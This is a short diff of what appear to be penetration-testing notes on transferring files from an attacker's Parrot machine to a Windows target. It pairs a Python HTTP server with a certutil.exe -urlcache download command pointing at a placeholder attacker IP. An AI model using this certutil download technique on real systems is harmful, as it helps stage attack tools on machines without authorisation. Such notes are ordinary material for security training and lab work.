@@ -1,5 +1,9 @@
+#### Python
 ```bash
-python3 -m http.server 8080 → (Common for both)
+python3 -m http.server
+
+GO to Windows -> browsers
+ip:8000
 ```
 ```bash
 Certutil.exe -Urlcache -f http://<ParrotIP>/eg.jpg C:\path\to\save\file\eg.jpg
